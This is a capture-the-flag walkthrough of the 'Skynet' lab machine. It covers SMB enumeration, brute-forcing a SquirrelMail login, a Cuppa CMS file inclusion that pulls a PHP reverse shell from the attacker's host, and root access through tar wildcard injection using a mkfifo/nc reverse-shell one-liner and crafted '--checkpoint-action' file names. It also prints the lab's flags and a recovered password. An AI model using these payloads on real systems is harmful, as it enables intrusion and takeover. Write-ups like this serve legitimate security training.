# Information

Name: Skynet

Difficulty: Easy

Description:
A vulnerabile terminator themed linux machine.
gobuster, smb, rfi

## Recon

**Search for open ports using nmap.**

Port and service scan with nmap:

![image](https://user-images.githubusercontent.com/43668197/140099687-fb9977ce-d14d-48ba-90bb-74d843409847.png)

We have a web server on port 80, SMB on ports 139 and 445, pop3 on 110, and imap on 143.

The first thing to do when there is a webserver is to run automated enumeration such as dirsearch or gobuster while manually looking over the site.

Not much to see on the initial page. So while waiting for dirsearch to complete I look at what other port is likely to be vulnerabile and run enum4linux to check out that SMB.

Discovered info on enum4linux:

`user:[milesdyson] rid:[0x3e8]`

```
|    Share Enumeration on 10.10.87.165    |
 ========================================= 

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	anonymous       Disk      Skynet Anonymous Share
	milesdyson      Disk      Miles Dyson Personal Share
	IPC$            IPC       IPC Service (skynet server (Samba, Ubuntu))
```
If we get the password for `milesdyson` account later we will have to check back here. For now lets see what is in `anonymous` share.

```
┌──(root💀kali)-[/home/kali/Downloads]
└─# smbclient //10.10.87.165/anonymous           
Enter WORKGROUP\root's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Nov 26 11:04:00 2020
  ..                                  D        0  Tue Sep 17 03:20:17 2019
  attention.txt                       N      163  Tue Sep 17 23:04:59 2019
  logs                                D        0  Wed Sep 18 00:42:16 2019
```

```
└─# cat attention.txt 
A recent system malfunction has caused various passwords to be changed. All skynet employees are required to change their password after seeing this.
-Miles Dyson
```

Not much to go on here. Lets take a look at the logs.

```
└─# cat log1.txt     
cyborg007haloterminator
terminator22596
terminator219
terminator20
terminator1989
terminator1988
terminator168
terminator16
terminator143
terminator13
terminator123!@#
terminator1056
terminator101
terminator10
terminator02
terminator00
roboterminator
pongterminator
manasturcaluterminator
exterminator95
exterminator200
dterminator
djxterminator
dexterminator
determinator
cyborg007haloterminator
avsterminator
alonsoterminator
Walterminator
79terminator6
1996terminator
```
Nothing in `log2.txt` or `log3.txt` but `log1.txt` looks promising. Maybe a list of possible passwords? Running hydra against this list doesn't appear to work so i've hit a dead end there.

Back to checking on dirsearch findings.

![image](https://user-images.githubusercontent.com/43668197/140105587-e14f04c9-e919-4dc7-a3c3-d20584946119.png)

`squirrelmail` looks interesting. Let's go check it out!

![image](https://user-images.githubusercontent.com/43668197/140106674-1266dd32-14cf-459d-ab42-ffa519b4024d.png)

The page source reveals version info `SquirrelMail version 1.4.23`. I attempt to log in and capture the request in burp to send to intruder and try the `log1.txt` file there.

![image](https://user-images.githubusercontent.com/43668197/140141018-9e79d6fb-84df-4342-a7fa-4326631ce700.png)

Success!

**What is Miles password for his emails?**

cyborg007haloterminator

![image](https://user-images.githubusercontent.com/43668197/140145478-c1ea8514-472c-476b-85ad-ee82a7c102c0.png)

Logging in I find out the password to his samba. Time to check there now!

![image](https://user-images.githubusercontent.com/43668197/140149710-78d9511f-cb0f-4b95-bc39-514120812ca9.png)

Within the `notes` directory there is a file called `important.txt`

![image](https://user-images.githubusercontent.com/43668197/140151234-ef982994-516f-418d-be09-3e377b5fefda.png)

**What is the hidden directory?**

/45kra24zxs28v3yd

![image](https://user-images.githubusercontent.com/43668197/140153175-83cb76a6-4374-40c7-a85a-f797b16432c6.png)

This leads us to the personal page of Miles Dyson, but not much else to see here. Time to try enumerating this newly found directory.

Here I found a login page for Cuppa CMS. 

![image](https://user-images.githubusercontent.com/43668197/140156654-6d76b54b-8453-4856-8b9b-af1fbb4f09be.png)


# Initial Exploitation

No version info to be found here but a search on `searchsploit cuppa` reveals a single exploit. I copy the file over to my working directory and have a look.

![image](https://user-images.githubusercontent.com/43668197/140161824-0da233bf-0e87-471b-a1fa-c06f1e2924b2.png)

File Inclusion. This will be easy to check for real quickly.

`http://10.10.87.165/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd`

![image](https://user-images.githubusercontent.com/43668197/140162327-b6db75ef-3030-47e2-95c2-d6ef6f53c96f.png)

Success! 

**What is the vulnerability called when you can include a remote file for malicious purposes?**

remote file inclusion 

![image](https://user-images.githubusercontent.com/43668197/140164989-13a6cd2d-b716-48d8-b64f-968060b712f6.png)

Using this information I upload my own php reverse shell to the server and get in.

`http://10.10.87.165/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://ip:8000/php-reverse-shell.php`

![image](https://user-images.githubusercontent.com/43668197/140165141-6fda0620-ef48-4b3a-99e4-20071538618b.png)

We are only `www-data` but have access to the user flag in `/home/milesdyson/user.txt`

**What is the user flag?**

7ce5c2109a40f958099283600a9ae807

# Privilege Escalation

It's time to go for that root flag.

`python3 -m http.server` on attacker system.
`wget http://ip:8000/linpeas.sh` on victim.

![image](https://user-images.githubusercontent.com/43668197/140166467-22df7435-c374-4bf0-8ce5-9e9c5170c691.png)

Theres a cron job here owned by root that we have access to. 

![image](https://user-images.githubusercontent.com/43668197/140166741-b4ef6b7e-cf80-4be6-a3a0-1d5fdde44bb2.png)

This creates a backup of everything in `/var/www/html.`

To get root all we need to do is:

```
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc attacker-ip 1234 >/tmp/f" > shell.sh
touch "/var/www/html/--checkpoint-action=exec=sh shell.sh"
touch "/var/www/html/--checkpoint=1"
```

![image](https://user-images.githubusercontent.com/43668197/140167717-5599fb82-a712-49c1-907a-af76bfef6c55.png)

**What is the root flag?**

3f0372db24753accc7179a282cd6a949
